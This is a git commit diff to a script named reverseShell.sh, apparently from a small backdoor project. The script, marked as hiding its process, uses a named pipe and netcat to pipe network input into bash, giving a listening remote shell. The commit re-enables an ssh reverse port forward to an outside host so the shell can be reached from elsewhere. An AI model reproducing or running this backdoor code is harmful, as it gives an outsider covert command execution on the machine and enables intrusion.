58afdff5c569f2c7499acebf8db5d6136f5dec4b
Adam Black <>
2013-06-18 15:28:45 +1000

    updated port

--- userPart/reverseShell.sh
+++ userPart/reverseShell.sh
@@ -5,11 +5,14 @@
 #hide this process
 localPort=9000
 
-#ssh -R 9012:localhost:$localPort kit100@shell.cjb.net &
+
+
 mkfifo file
 nc -l -k "$localPort" < file | bash >file & # uses named pipe
 sleep 1
 rm file
+
+ssh -R 9012:localhost:$localPort kit100@shell.cjb.net 
 
 #TODO GET OUTPUT
 
